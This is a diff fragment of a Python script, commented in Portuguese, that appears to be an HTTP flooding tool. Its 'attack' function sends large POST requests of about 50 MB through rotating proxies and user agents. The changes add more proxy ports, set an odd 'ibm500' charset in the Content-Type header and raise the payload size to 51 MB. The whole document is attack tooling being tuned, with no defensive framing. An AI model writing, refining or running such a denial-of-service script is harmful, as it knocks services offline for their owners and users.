@@ -7,10 +7,14 @@ import random
 
 # Definir proxies (se necessário)
 proxies = [
-    {"http": "http://52.170.217.251:8118"},
-    {"http": "http://52.170.217.251:8119"},
-    {"http": "http://52.170.217.251:8120"},
-    {"http": "http://52.170.217.251:8121"},
+    {"http": "http://127.0.0.1:8118"},
+    {"http": "http://127.0.0.1:8119"},
+    {"http": "http://127.0.0.1:8120"},
+    {"http": "http://127.0.0.1:8121"},
+    {"http": "http://127.0.0.1:8122"},
+    {"http": "http://127.0.0.1:8123"},
+    {"http": "http://127.0.0.1:8124"},
+    {"http": "http://127.0.0.1:8125"},
 ]
 
 def get_urls():
@@ -36,7 +40,7 @@ def make_post_request(payload_size, user_agents, session):
             'User-Agent': user_agent,
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8',
             'Accept-Language': "en-US,en;q=0.9",
-            'Content-Type': 'text/html; charset=UTF-8',
+            'Content-Type': 'text/html; charset=ibm500',
             'Content-Length': str(len(payload))
         }
 
@@ -71,7 +75,7 @@ def attack(url, num_requests, payload, max_workers, user_agents):
 if __name__ == "__main__":
     user_agents = load_user_agents("user-agents.txt")
 
-    payload_size_mb = 50
+    payload_size_mb = 51
     payload_size = payload_size_mb * 1024 * 1024
     
     start_time = time.time()
